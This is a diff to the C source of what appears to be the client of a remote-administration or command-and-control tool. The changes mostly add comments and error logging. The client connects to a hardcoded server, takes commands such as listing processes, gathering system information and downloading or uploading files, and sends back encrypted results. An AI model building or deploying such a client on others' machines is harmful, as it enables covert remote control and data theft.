@@ -17,6 +17,7 @@
 void downloadFile(char buffer[BUF_SIZE], char *URL);
 void uploadFile(char buffer[BUF_SIZE], char *URL);
 
+// General function type for handlers
 typedef void (*commandFunction)(char buffer[BUF_SIZE], char *URL);
 
 typedef struct
@@ -25,6 +26,7 @@ typedef struct
     commandFunction action;
 } commandAction;
 
+// Mapping of each command to its handler function
 commandAction commandMapping[] = {
     {"PROCESSES", &getProcesses},
     {"INFORMATION", &getInformation},
@@ -113,11 +115,20 @@ void downloadFile(char buffer[BUF_SIZE], char *URL)
     }
 }
 
+/**
+ * Wrapper for socket::recv
+ */
 int fetchData(SOCKET *socket, char buffer[BUF_SIZE])
 {
     return recv(*socket, buffer, BUF_SIZE, 0x0);
 }
 
+/**
+ * Find the corresponding command handler for a given command and return the result of the handler
+ *
+ * @param commandName the string repr of the command
+ * @param URL the URL required for special commands
+ */
 char *commandHandler(char *commandName, char *URL)
 {
     static char buffer[BUF_SIZE];
@@ -132,6 +143,10 @@ char *commandHandler(char *commandName, char *URL)
     return NULL;
 }
 
+/**
+ * Responsible for the two stage communication between client and server
+ * Mostly a wrapper around socket::send
+ */
 int sendResponse(SOCKET *socket, COMMAND commandCode, char *buffer, int bufLen)
 {
     char message[BUF_SIZE];
@@ -143,53 +158,80 @@ int sendResponse(SOCKET *socket, COMMAND commandCode, char *buffer, int bufLen)
     return send(*socket, buffer, bufLen, 0x0);
 }
 
+/**
+ * Handle server requests and error management
+ *
+ * @param socket server side socket
+ */
 void serverHandler(SOCKET socket)
 {
     COMMAND command;
-    char buffer[BUF_SIZE], URL[BUF_SIZE], time[TIME_BUF_SIZ];
+    char buffer[BUF_SIZE], URL[BUF_SIZE];
     int bytesReceived, expectedBuffer;
+
+    // Main Loop
     while (TRUE)
     {
         bytesReceived = fetchData(&socket, buffer);
         if (bytesReceived == SOCKET_ERROR || !bytesReceived)
         {
+            fprintf(stderr, "[%s][E] Could not fetch data", getCurrTime());
             break;
         }
         buffer[bytesReceived] = CF_NULL;
+        // Parse the command
         parseCommand(buffer, &command, &expectedBuffer, NULL, FALSE);
         char *commandName = decodeCommand(command);
+
+        // Check that it is a special command
         if (expectedBuffer > 0)
         {
+            // Fetch additional data
             bytesReceived = fetchData(&socket, buffer);
             if (bytesReceived == SOCKET_ERROR || !bytesReceived)
             {
+                fprintf(stderr, "[%s][E] Could not fetch data", getCurrTime());
                 break;
             }
             buffer[bytesReceived] = CF_NULL;
+            // Log request
             parseCommand(buffer, &command, &expectedBuffer, URL, TRUE);
             printf("[%s] Received %s [%s]\n", getCurrTime(), commandName, URL);
         }
         else
         {
+            // Log request
             printf("[%s] Received %s\n", getCurrTime(), commandName);
             URL[0] = CF_NULL;
         }
+
+        // Perform the requested operation
+        char *result = commandHandler(commandName, URL);
+        if (result == NULL)
+        {
+            fprintf(stderr, "[%s] Handle Error: %s\n", getCurrTime(), commandName);
+            continue;
+        }
+
+        // Check for invalid or quit commands
         if (strcmp(commandName, QUIT) == 0)
         {
             break;
         }
-
-        char *result = commandHandler(commandName, URL);
-        if (result == NULL)
+        else if (strcmp(commandName, INVALID_COMMAND_TYPE) == 0)
         {
-            getCurrTime(time);
-            printf("[%s] Handle Error: %s\n", getCurrTime(), commandName);
-            continue;
+            break;
         }
+
+        // Cleanup result
         strip(result);
         int bufLen = strlen(result);
+        // Encrypt and send response
         encrypt(command, result, bufLen, bufLen);
-        sendResponse(&socket, command, result, bufLen);
+        if (sendResponse(&socket, command, result, bufLen) == SOCKET_ERROR)
+        {
+            fprintf(stderr, "[%s][E] Error sending response\n", getCurrTime());
+        }
     }
     closesocket(socket);
     return;
@@ -198,12 +240,6 @@ void serverHandler(SOCKET socket)
 int main(void)
 {
     printf("[i] Initializing Client\n");
-    // char serverIp[BUF_SIZE], serverPort[BUF_SIZE];
-    // getInput("[?] Server IP Address: ", serverIp);
-    // getInput("[?] Server Port: ", serverPort);
-    // int port = strtol(serverPort, NULL, 0xA);
-
-    // strip(serverIp);
     char *serverIp = HOST;
     int serverPort = PORT;
     SOCKET clientSocket = createSocket(AF_INET, SOCK_STREAM, 0);
@@ -212,6 +248,7 @@ int main(void)
         exit(10);
     }
 
+    // Accept and handle server connection
     if (initializeClientSocket(&clientSocket, serverIp, serverPort) != 0)
     {
         printf("[E] Could not connect to %s on port %i\n", serverIp, serverPort);
